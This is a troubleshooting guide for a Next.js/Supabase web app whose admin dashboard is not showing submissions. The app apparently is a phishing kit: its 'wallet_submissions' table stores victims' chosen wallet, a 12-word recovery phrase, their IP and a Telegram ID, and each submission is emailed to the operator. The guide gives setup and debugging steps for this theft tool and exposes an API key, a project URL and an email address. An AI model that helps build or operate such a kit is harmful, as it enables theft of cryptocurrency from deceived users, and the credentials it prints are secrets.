# 🔧 Troubleshooting Guide - Admin Dashboard Not Showing Submissions

## 🚨 Problem Description
The admin dashboard is not displaying submitted phrases even though:
- ✅ Email notifications are working
- ✅ Data is being submitted successfully
- ❌ Admins cannot see the submissions

## 🔍 Root Cause
The main issue is likely that **environment variables are not properly loaded** by Next.js. The `env.example` file contains the correct values, but Next.js needs them in a `.env.local` file.

## 🛠️ Solution Steps

### Step 1: Set Up Environment Variables

#### Option A: Use the Setup Scripts (Recommended)
1. **Windows Batch File:**
   ```cmd
   setup-env.bat
   ```

2. **PowerShell Script:**
   ```powershell
   .\setup-env.ps1
   ```

#### Option B: Manual Setup
1. Copy `env.example` to `.env.local`:
   ```cmd
   copy env.example .env.local
   ```

2. Verify `.env.local` contains:
   ```
   NEXT_PUBLIC_SUPABASE_URL=https://ecimwqpgebtdfhynhqkb.supabase.co
   NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   RESEND_API_KEY=re_dEQyGG4b_3rTKvQXpY6vYqRXF2RkgAaYB
   NOTIFICATION_EMAILS=lilynoahhss@gmail.com
   ```

### Step 2: Restart Development Server
After creating `.env.local`, restart your Next.js server:
```cmd
npm run dev
```

### Step 3: Test Database Connection
1. Go to `/test-db` page
2. Click "🔍 Test Connection" button
3. Check console logs for any errors

### Step 4: Check Admin Dashboard
1. Go to `/only-admins` page
2. Look for connection status indicators
3. Check browser console for detailed logs

## 🔍 Debugging Features Added

### Enhanced Logging
- **API Routes:** Added comprehensive logging for database operations
- **Admin Page:** Added connection status indicators and error details
- **Test Page:** Created `/test-db` for testing database connectivity

### Connection Status Display
The admin page now shows:
- ✅ Database connection status
- ❌ Error details if connection fails
- 🔑 Environment variable status
- 📊 Real-time submission count

### Test Database Page
Visit `/test-db` to:
- Test database connectivity
- Test data submission
- View detailed error information

## 🚨 Common Issues & Solutions

### Issue 1: "Missing Supabase environment variables"
**Solution:** Ensure `.env.local` exists and contains the correct values

### Issue 2: "Database connection failed"
**Solution:** 
1. Check Supabase project is active
2. Verify API keys are correct
3. Check network connectivity

### Issue 3: "No submissions found"
**Solution:**
1. Submit a test phrase first
2. Check if table `wallet_submissions` exists in Supabase
3. Verify table structure matches expected schema

## 📋 Expected Database Schema

The `wallet_submissions` table should have these columns:
```sql
- id (auto-increment)
- selected_wallet (text)
- phrase (array of 12 words)
- timestamp (timestamp)
- ip (text)
- telegram_id (text, nullable)
- created_at (timestamp, auto)
```

## 🧪 Testing Workflow

1. **Set up environment variables**
2. **Restart development server**
3. **Test database connection** (`/test-db`)
4. **Submit a test phrase** (main page)
5. **Check admin dashboard** (`/only-admins`)
6. **Verify email notifications** (check inbox)

## 📞 If Problems Persist

1. Check browser console for detailed error logs
2. Check server console for API route errors
3. Verify Supabase project settings
4. Test with the `/test-db` page
5. Check network tab for failed API requests

## 🔄 Data Flow

```
User submits phrase → API stores in Supabase → Email sent → Admin dashboard fetches data
     ↓                    ↓                    ↓                    ↓
  Frontend form    submit-phrase route    Email service    submissions route
```

## ✅ Success Indicators

When everything is working correctly, you should see:
- ✅ Green "Database Connected Successfully" message
- ✅ Submissions count > 0
- ✅ Latest submission timestamp displayed
- ✅ Real-time data updates every 25 seconds
- ✅ Email notifications working
- ✅ Admin dashboard showing all submissions
